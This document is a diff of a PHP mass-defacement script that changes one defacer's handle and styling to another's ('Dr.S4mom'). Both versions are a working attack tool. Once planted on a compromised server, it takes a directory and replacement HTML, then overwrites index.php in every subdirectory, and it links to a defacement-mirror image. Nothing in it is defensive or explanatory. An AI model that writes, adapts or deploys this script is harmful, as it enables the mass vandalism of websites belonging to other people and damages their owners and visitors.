@@ -1,21 +1,15 @@
 <?php
- 
-/*
- 
-Mass Defacement Script By ~xAn0nPH
- 
-Contact => http://facebook.com/AnonTeamX.gov
- 
-*/
- 
-echo "<title>Mass Defacer - By xAn0nPH</title>";
+
+echo "<title>Mass Defacer Script by Dr.S4mom</title>";
 echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
-echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
+echo "<body bgcolor='white'><font color=red'><font face='comic sans ms'>";
 echo "<center><form method='POST'>";
-echo "Base Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
-echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
-echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>//Put Your Index Here</textarea><br>";
-echo "<input type='submit' value='Start'></form></center>";
+echo "<img src='http://zonehmirrors.org/defaced/2017/11/26/mwc.ac.in/i.imgur.com/gTOJK9F.png' width=30% hight=40% />
+<hr color='black'><font color='black'>Target Folder</font><br>
+<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
+echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
+echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by Dr.S4mom</textarea><br>";
+echo "<input type='submit' value='7wimo :v'></form></center>";
  
 if (isset ($_POST['base_dir']))
 {
@@ -27,14 +21,14 @@ if (isset ($_POST['base_dir']))
  
         @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
  
-        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
+        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
  
         foreach ($files as $file):
                 if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                 {
-                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
+                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                         if (file_put_contents ($index, $_POST['index']))
-                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
+                                echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
                 }
         endforeach;
 }
